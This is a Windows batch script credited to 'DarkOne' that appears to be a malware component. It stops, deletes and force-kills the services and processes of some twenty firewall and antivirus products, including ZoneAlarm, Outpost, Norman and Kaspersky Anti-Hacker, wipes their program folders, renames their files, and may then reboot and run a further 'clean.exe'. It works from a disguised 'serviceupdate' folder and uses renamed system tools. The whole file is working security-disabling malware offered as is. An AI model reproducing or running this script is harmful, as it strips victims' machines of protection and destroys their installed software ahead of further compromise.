echo ... ------------------
echo ... Created By DarkOne
echo ... ------------------

cd %windir%\serviceupdate

echo ... Zone Alarm
net stop vsmon
net stop CAISafe
iexplore -kf vsmon.exe
iexplore -kf isafe.exe
iexplore -kf zclient
iexplore -kf zonealarm.exe
iexplore -kf zatutor.exe
iexplore -kf zlavscan.dll
regsrvc.exe delete CAISafe
regsrvc.exe delete vsmon
del %windir\system32\ZoneLabs\ /F /S /Q
del "C:\Program Files\Zone Labs\" /F /S /Q

echo ... OutPost
net stop OutpostFirewall
regsrvc.exe delete OutpostFirewall
iexplore -kf outpost.exe
del "C:\Program Files\Agnitum\Outpost Firewall\" /F /S /Q
del "C:\Program Files\Agnitum\Outpost Firewall\configuration1.cfg"

echo ... Blackice
net stop RapApp
net stop BlackICE
regsrvc.exe delete RapApp
regsrvc.exe delete BlackICE
iexplore -kf blackd.exe
iexplore -kf blackice.exe
iexplore -kf rapapp.exe
iexplore -kf ProUtil.exe
del "C:\Program Files\ISS\BlackICE\" /F /S /Q
del "C:\Program Files\ISS\" /F /S /Q

echo ... LavaSoft FW
net stop LavasoftFirewall
regsrvc.exe delete LavasoftFirewall
iexplore -kf lpfw.exe
del "C:\Program Files\Lavasoft\Personal Firewall\" /F /S /Q

echo ... Tiny Personal Firewall
net stop UmxCfg
net stop UmxAgent
net stop UmxLU
net stop UmxPol
net stop UmxFwHlp
regsrvc.exe delete UmxCfg
regsrvc.exe delete UmxAgent
regsrvc.exe delete UmxLU
regsrvc.exe delete UmxPol
regsrvc.exe delete UmxFwHlp
iexplore -kf UmxFwHlp.exe
iexplore -kf umxlu.exe
iexplore -kf UmxCfg.exe
iexplore -kf UmxAgent.exe
iexplore -kf UmxPol.exe
iexplore -kf amon.exe
iexplore -kf UmxCfg.exe
iexplore -kf cfgtool.exe
del "C:\Program Files\Common Files\PFShared\" /F /S /Q
del "C:\Program Files\Tiny Firewall\" /F /S /Q

echo ... Sygate Personal Firewall Pro
net stop SmcService
regsrvc.exe delete SmcService
iexplore -kf smc.exe
del "C:\Program Files\Sygate\" /F /S /Q


echo ... Sunbelt Kerio Personal Firewall 4
net stop KPF4
regsrvc.exe delete KPF4
iexplore -kf kpf4gui.exe
iexplore -kf kpfss.exe
del "C:\Program Files\Sunbelt Software\" /F /S /Q
del "C:\Program Files\Sunbelt Software\Personal Firewall 4\" /F /S /Q

echo ... DeerField.com VisNetic Firewall
net stop DeerFieldFirewall
regsrvc.exe delete DeerFieldFirewall
iexplore -kf DFW.exe
del "C:\Program Files\Deerfield.com\VisNetic Firewall\" /F /S /Q

echo ... Armor2net Personal Firewall
iexplore -kf armor2net.exe
del "C:\Program Files\Armor2net\Armor2net Personal Firewall\" /F /S /Q

echo ... Norman Antivirus/FireWall
net stop NipSvc
net stop "Norman NJeeves"
net stop "Norman Type-R"
net stop nvcoas
net stop NVCScheduler
net stop "Norman ZANDA"
regsrvc.exe delete NipSvc
regsrvc.exe delete "Norman NJeeves"
regsrvc.exe delete "Norman Type-R"
regsrvc.exe delete nvcoas
regsrvc.exe delete NVCScheduler
regsrvc.exe delete "Norman ZANDA"
iexplore -kf ZLH.EXE
iexplore -kf NPFMSG.EXE
iexplore -kf NPFSVICE.EXE
iexplore -kf Zanda.exe
iexplore -kf nvcoas.exe
iexplore -kf NVCSCHED.EXE
iexplore -kf NJEEVES.EXE
iexplore -kf nipsvc.exe
iexplore -kf NIP.exe
iexplore -kf cclaw.exe
iexplore -kf ncut.exe
iexplore -kf NPFC.EXE
del "C:\Norman\Bin\" /F /S /Q
del "C:\Norman\Nvc\BIN\" /F /S /Q
del "C:\Program Files\Norman\NPF\" /F /S /Q
del "C:\Program Files\Norman\" /F /S /Q

echo ... Comodo Personal Firewall
iexplore -kf CLPTray.exe
iexplore -kf CLPGUIApp.exe
iexplore -kf CPF.exe
del "C:\Program Files\Comodo\LaunchPad\" /F /S /Q

echo ... Fireball Personal Firewall
net stop FireballDTA_srv
regsrvc.exe delete FireballDTA_srv
iexplore -kf FBTray.exe
iexplore -kf FireballDTA.exe
iexplore -kf console.exe
del "C:\Program Files\RedCannon\Fireball\" /F /S /Q

echo ... Private Firewall
iexplore -kf PF4.exe
iexplore -kf PFReport.exe
del "C:\Program Files\Privacyware\Privatefirewall 4.0\" /F /S /Q

echo ... Prisma Firewall
iexplore -kf prisma-monitor.exe
del "C:\Program Files\Prisma Firewall\" /F /S /Q

echo ... WebrootDesktopFirewall
net stop WebrootFirewall
net stop WebrootDesktopFirewallDataService
regsrvc.exe delete WebrootFirewall
regsrvc.exe delete WebrootDesktopFirewallDataService
iexplore -kf WebrootDesktopFirewall.exe
iexplore -kf WDFDataService.exe
del "C:\Program Files\Webroot\Desktop Firewall\" /F /S /Q

echo ... NetFirewall
iexplore -kf mmc.exe
cd C:\Program Files\NT Kernel Resources\NeT Firewall\
rename Firewall.msc Firewall.dum
cd %windir%\serviceupdate\
del "C:\Program Files\NT Kernel Resources\NeT Firewall\" /F /S /Q

echo ... Terminet
iexplore -kf Terminet.exe
del "C:\Program Files\InfoTeCS\TermiNET\" /F /S /Q

cd "C:\Program Files\Kaspersky Lab\Kaspersky Anti-Hacker"
rename kavpf.exe kavpf.dum
rename keymanager.exe keymanager.dum
rename uninstall.exe uninstall.dum
rename uninstall.ini uninstallini.dum
del "C:\Program Files\Kaspersky Lab\Kaspersky Anti-Hacker" /F /S /Q
cd %windir%\serviceupdate
IF EXIST "C:\Program Files\Kaspersky Lab\Kaspersky Anti-Hacker\kavpf.dum" goto reboot

goto cleanup
:reboot
MD C:\Recycler
cd C:\recycler
MD C:\recycler\WARNING.KAV.Detected
shutdown -r
:cleanup
echo ... cleanup
cd %windir%\serviceupdate
clean.exe
